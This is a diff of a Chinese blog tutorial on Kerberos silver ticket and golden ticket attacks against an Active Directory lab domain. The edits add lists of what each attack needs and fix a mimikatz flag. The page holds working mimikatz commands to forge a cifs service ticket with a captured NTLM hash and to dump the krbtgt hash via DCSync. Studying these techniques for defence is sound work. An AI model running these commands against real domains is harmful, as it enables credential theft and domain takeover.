@@ -383,7 +383,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><p>由服务账号NTLM加密</p>
 </li>
 </ul>
-<h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><p>以cifs服务为例</p>
+<h5 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h5><p>所需</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">域名称</span><br><span class="line">域成员用户的sid</span><br><span class="line">域服务账号NTLM HASH</span><br><span class="line">目标服务器主机名</span><br></pre></td></tr></table></figure>
+
+<p>以cifs服务为例</p>
 <p>user01域成员无法直接访问域控磁盘，通过伪造cifs服务票据进行尝试</p>
 <p><img src="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir域控c盘拒绝"></p>
 <p>获取user01的sid</p>
@@ -398,11 +401,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><img src="https://i.loli.net/2021/05/13/RufvWq4Cgx9oLFN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/RufvWq4Cgx9oLFN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dc_logonpasswords"></p>
 <p><img src="https://i.loli.net/2021/05/13/Zjey9TG238a7C5H.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/Zjey9TG238a7C5H.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dc_htlm"></p>
 <p>伪造服务票据ST</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::golden &#x2F;domain:thomas.com &#x2F;sid:S-1-5-21-3339550086-1671576957-2609362215 &#x2F;target:win-dc.thomas.com &#x2F;rc4:05d2835ce303d171b5e94ac5921555dd &#x2F;service:cifs &#x2F;user:test &#x2F;ppt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe kerberos::golden &#x2F;domain:thomas.com &#x2F;sid:S-1-5-21-3339550086-1671576957-2609362215 &#x2F;target:win-dc.thomas.com &#x2F;rc4:05d2835ce303d171b5e94ac5921555dd &#x2F;service:cifs &#x2F;user:test &#x2F;ptt</span><br></pre></td></tr></table></figure>
 
 <p>tips：sid最后的<code>-</code>后的不用加</p>
 <p><img src="https://i.loli.net/2021/05/13/tCBOI4E1qvWpybo.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/tCBOI4E1qvWpybo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="伪造票据"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden: 使用minikatz中票据的功能</span><br><span class="line">&#x2F;domain: 指定域名</span><br><span class="line">&#x2F;sid: Client端查询的sid号，在域控中查询也可以，都是一样的</span><br><span class="line">&#x2F;target: 主域控中的计算机全名</span><br><span class="line">&#x2F;rc4: 在域控中抓取的hash(NTLM)</span><br><span class="line">&#x2F;service: 需要伪造的服务(cifs只是其中的一种服务，可伪造的服务很多)</span><br><span class="line">&#x2F;user: 需要伪造的用户名(可自定义)</span><br><span class="line">&#x2F;ppt: 伪造了以后直接写入到内存中</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden: 使用minikatz中票据的功能</span><br><span class="line">&#x2F;domain: 指定域名</span><br><span class="line">&#x2F;sid: Client端查询的sid号，在域控中查询也可以，都是一样的</span><br><span class="line">&#x2F;target: 主域控中的计算机全名</span><br><span class="line">&#x2F;rc4: 在域控中抓取的hash(NTLM)</span><br><span class="line">&#x2F;service: 需要伪造的服务(cifs只是其中的一种服务，可伪造的服务很多)</span><br><span class="line">&#x2F;user: 需要伪造的用户名(可自定义)</span><br><span class="line">&#x2F;ptt: 伪造了以后直接写入到内存中</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2021/05/13/qNxGJhlCnToYzIB.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/qNxGJhlCnToYzIB.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="伪造并导入内存成功"></p>
 <p>查看票据，导入成功</p>
@@ -418,7 +421,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li>与KDC交互，但不与AS交互</li>
 <li>由krbtgt NTLM hash加密</li>
 </ul>
-<h5 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h5><p>user01域成员无法直接访问域控磁盘，通过伪造TGT获取域控权限</p>
+<h5 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h5><p>所需</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域名称</span><br><span class="line">域krbtgt用户的sid</span><br><span class="line">域krbtgt用户的NTLM HASH</span><br></pre></td></tr></table></figure>
+
+
+
+<p>user01域成员无法直接访问域控磁盘，通过伪造TGT获取域控权限</p>
 <p><img src="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" class="lazyload" data-srcset="https://i.loli.net/2021/05/13/4CvdybfJZuIKLlN.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir域控c盘拒绝"></p>
 <p>域管登录域控，执行命令，查看<code>krbtgt</code>用户<code>sid</code>和<code>NTLM hash</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync &#x2F;domain:thomas.com &#x2F;user:krbtgt&quot; exit &gt; krbtgt.txt</span><br></pre></td></tr></table></figure>
@@ -462,10 +470,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-13T18:31:05+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-14T10:09:03+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2021年5月13日</p>
+    <p>更新于：2021年5月14日</p>
   </a>
 </div>
 
